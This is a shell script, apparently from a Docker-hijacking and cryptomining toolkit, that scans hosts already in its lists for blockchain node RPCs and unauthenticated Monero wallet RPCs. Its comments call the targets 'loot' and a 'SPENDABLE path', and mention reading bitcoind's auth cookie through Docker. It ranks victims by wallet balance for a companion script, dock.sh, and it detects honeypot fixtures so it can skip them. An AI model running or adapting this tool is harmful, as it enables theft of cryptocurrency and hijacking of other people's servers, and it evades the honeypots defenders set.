#!/bin/sh
# ============================================================================
# cryptofind.sh - find the CRYPTO boxes among the daemons we already know.
#
# Two tells, both free (no container created, ~8 requests per host):
#   1) a chain RPC that answers a chain-SPECIFIC method. That NAMES the chain instead of
#      merely proving "some JSON-RPC is here" - the mistake the first pass made, where
#      the request body arrived backslash-mangled and every endpoint answered -32700
#      Parse error (which still proved a server, but not which one).
#   2) a WALLET rpc. monero-wallet-rpc answers get_balance on 18082/18083 over plain
#      HTTP - a SPENDABLE path, not a fingerprint. bitcoind on 8332 wants auth, so a 401
#      there is equally conclusive, and its .cookie is readable through docker anyway.
#
# Why it matters: identical CPU to any other host (so it mines identically) but far
# better loot, and dock.sh walks these first via .hunt/crypto.list.
#
# usage: cryptofind.sh            driver: every daemon we know, fixtures skipped
#        cryptofind.sh <ip> ...   worker: probe these, print ip<TAB>score<TAB>evidence
# ============================================================================
verword() {
    case "$1" in
        0x1) echo mainnet ;; 0x89) echo polygon ;; 0xa4b1) echo arbitrum ;;
        0xa) echo optimism ;; 0x2105) echo base ;; 0x38) echo bnb ;;
        *) echo "chainid=$1" ;;
    esac
}

if [ "$#" -gt 0 ]; then
    for ip in "$@"; do
        score=0; ev=""
        # Fixture tell, checked BEFORE any chain call: a real engine answers an unknown
        # method with -32601 in a short reply, while a fake answers EVERYTHING on EVERY
        # port with one big blob that echoes the request back. 147.139.164.26 did that
        # with a single 4129-byte body on 18081 AND 18082, which was enough to "score" it
        # 14 as substrate+solana+tendermint+bitcoind+WALLET when it held nothing.
        fake=0
        for fp in 18081 8545; do
            fo=$(curl -sS -m 3 -X POST -H 'Content-Type: application/json' \
                 -d '{"jsonrpc":"2.0","id":"0","method":"zzzzNope"}' \
                 "http://$ip:$fp/json_rpc" 2>/dev/null) || fo=""
            case "$fo" in *zzzzNope*) fake=1; break ;; esac
        done
        if [ "$fake" = 1 ]; then
            printf '%s\t0\tfixture-echo\n' "$ip"
            continue
        fi
        rpc() {   # port path method [version]
            o=$(curl -sS -m 5 -X POST -H 'Content-Type: application/json' \
                -d "{\"jsonrpc\":\"${5:-2.0}\",\"method\":\"$3\",\"id\":1}" \
                "http://$ip:$1$2" 2>/dev/null) || o=""
            printf '%s' "$o"
        }
        o=$(rpc 8545 / eth_chainId)
        case "$o" in *'"result":"0x'*)
            cid=$(printf '%s' "$o" | grep -o '"result":"0x[0-9a-fA-F]*"' | head -1 | cut -d'"' -f4)
            score=$((score + 2)); ev="$ev evm:$(verword "$cid")" ;;
        esac
        o=$(rpc 9933 / system_chain)
        case "$o" in *'"result":"'*)
            ch=$(printf '%s' "$o" | grep -o '"result":"[^"]*"' | head -1 | cut -d'"' -f4)
            score=$((score + 2)); ev="$ev substrate:$ch" ;;
        esac
        o=$(rpc 18081 /json_rpc get_info)
        case "$o" in *alt_blocks_count*|*adjusted_time*) score=$((score + 2)); ev="$ev monerod" ;; esac
        o=$(rpc 8899 / getVersion)
        case "$o" in *'"result"'*) score=$((score + 2)); ev="$ev solana" ;; esac
        o=$(rpc 26657 /status status)
        case "$o" in *node_info*|*'"result"'*) score=$((score + 2)); ev="$ev tendermint" ;; esac
        # bitcoind. A bare 200 on :8332 proves only "some HTTP server on 8332" - the first
        # pass counted 36 hosts that way. Decisive instead: bitcoind's auth challenge names
        # itself - `WWW-Authenticate: Basic realm="jsonrpc"` - or a 200 body carries a real
        # getblockchaininfo "chain" field. A generic 401 from anything else will not match.
        br=$(curl -sS -m 5 -D - -X POST -H 'Content-Type: application/json' \
             -d '{"jsonrpc":"1.0","method":"getblockchaininfo","id":1}' -w '\n%{http_code}' \
             "http://$ip:8332/" 2>/dev/null) || br=""
        bc=$(printf '%s' "$br" | tail -1)
        case "$bc" in
            401) case "$br" in *'realm="jsonrpc"'*) score=$((score + 2)); ev="$ev bitcoind" ;; esac ;;
            200) case "$br" in *'"chain"'*) score=$((score + 2)); ev="$ev bitcoind" ;; esac ;;
        esac
        for wp in 18082 18083; do
            o=$(rpc "$wp" /json_rpc get_balance)
            case "$o" in *balance*)
                bal=$(printf '%s' "$o" | grep -o '"balance":[0-9]*' | head -1 | cut -d: -f2)
                score=$((score + 3)); ev="$ev WALLET$wp:${bal}pico" ;;
            esac
        done
        [ "$score" -gt 0 ] && printf '%s\t%s\t%s\n' "$ip" "$score" "$ev"
    done
    exit 0
fi

cd "${SYSDIR:-/tmp/.sysd}/.hunt" 2>/dev/null || cd "$(dirname "$0")/.hunt" 2>/dev/null || exit 1
[ -f dock.mock ] || touch dock.mock
cat dock.owned dock.live dock.seen 2>/dev/null | cut -f1 | tr -d '\r' \
  | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u \
  | grep -vxF -f dock.mock 2>/dev/null > _cf.cand
echo "scanning=$(grep -c . _cf.cand)"
xargs -P 40 -n 1 sh "${SYSDIR:-/tmp/.sysd}/cryptofind.sh" < _cf.cand > _cf.out 2>/dev/null
sort -t"$(printf '\t')" -k2 -rn _cf.out -o crypto.list 2>/dev/null || cp _cf.out crypto.list
# a score-0 line is a proven FIXTURE (it echoed our bogus method back), so drop it: dock.sh
# walks crypto.list and there is no point spending a container on a host that holds nothing.
awk -F'\t' '($2 + 0) > 0' crypto.list > _cf.pos 2>/dev/null && mv _cf.pos crypto.list
echo "crypto_found=$(grep -c . crypto.list)"
echo "--- HIGH CONFIDENCE (score>=3: a wallet RPC or several chains)"
awk -F'\t' '$2 >= 3' crypto.list 2>/dev/null | head -25
